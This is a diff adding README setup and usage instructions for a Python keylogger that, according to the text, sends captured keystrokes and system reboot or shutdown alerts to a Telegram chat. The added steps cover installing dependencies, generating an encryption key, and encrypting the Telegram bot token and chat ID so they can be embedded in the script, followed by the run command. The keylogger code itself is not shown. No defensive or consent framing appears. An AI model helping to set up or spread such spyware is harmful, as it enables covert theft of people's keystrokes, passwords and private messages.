@@ -18,3 +18,49 @@ This script implements a **keylogger** that sends keystrokes and system status u
 
 ## 📁 File Structure
 
+
+---
+
+## 🛠️ Prerequisites
+
+1. **Python 3.6+**
+2. Required Python packages:
+   - `pynput`
+   - `cryptography`
+   - `requests`
+   - `psutil`
+
+Install the dependencies using pip:
+
+bash
+````pip install pynput cryptography requests psutil````
+
+🔑 Setup Instructions
+1. Generate an encryption key using the cryptography library:
+
+   ``from cryptography.fernet import Fernet
+   key = Fernet.generate_key()
+   print(key)``
+
+2. Replace the placeholder encryption_key in the code with your generated key.
+
+3. Encrypt your Telegram bot token and chat ID:
+   ``cipher_suite = Fernet(encryption_key)
+   encrypted_bot_token = cipher_suite.encrypt(b'YOUR_TELEGRAM_BOT_TOKEN')
+   encrypted_chat_id = cipher_suite.encrypt(b'YOUR_CHAT_ID')
+   print(encrypted_bot_token, encrypted_chat_id)``
+
+4. Replace the placeholders encrypted_bot_token and encrypted_chat_id in the code with the generated encrypted values.
+
+🖥️ Usage
+1. Run the script:
+   ``python illusivekeylogger.py``
+
+2. The keylogger will:
+
+   Begin monitoring keystrokes.
+   Send real-time updates to your Telegram chat.
+   Notify upon system reboots or shutdowns.
+
+3. To stop the keylogger, press the ESC key.
+
